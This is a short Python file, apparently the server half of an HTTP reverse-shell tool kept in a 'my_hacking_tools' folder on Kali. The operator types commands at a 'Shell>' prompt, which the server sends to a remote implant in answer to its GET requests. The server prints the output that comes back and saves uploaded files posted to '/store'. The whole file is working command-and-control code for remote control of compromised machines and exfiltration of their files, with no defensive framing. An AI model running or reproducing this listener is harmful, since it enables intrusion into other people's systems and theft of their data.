#  server side
import http.server
import os, cgi
HOST_NAME = '192.168.1.23'
PORT_NUMBER = 8085

class MyHandler(http.server.BaseHTTPRequestHandler):

    def do_GET(self):

        command = input("Shell> ")
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(command.encode())

    def do_POST(self):


        if self.path == '/store':
            try:
                ctype, pdict = cgi.parse_header(self.headers.get('content-type'))
                if ctype == 'multipart/form-data':
                    fs = cgi.FieldStorage(fp=self.rfile, headers = self.headers, environ= {'REQUEST_METHOD': 'POST'})
                else:
                    print('[-]Unexpected POST request')
                fs_up = fs['file']
                with open('/home/kali/python_tools/my_hacking_tools/newFile.txt', 'wb') as o:
                    print('[+] Writing file ..')
                    o.write(fs_up.file.read())
                    self.send_response(200)
                    self.end_headers()
            except Exception as e:
                print(e)
            return
        self.send_response(200)
        self.end_headers()
        length = int(self.headers['Content-length'])
        postVar = self.rfile.read(length)
        print(postVar.decode("utf-8", "ignore"))

if __name__ == '__main__':
    server_class = http.server.HTTPServer
    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print ('[!] Server is terminated')
        httpd.server_close()

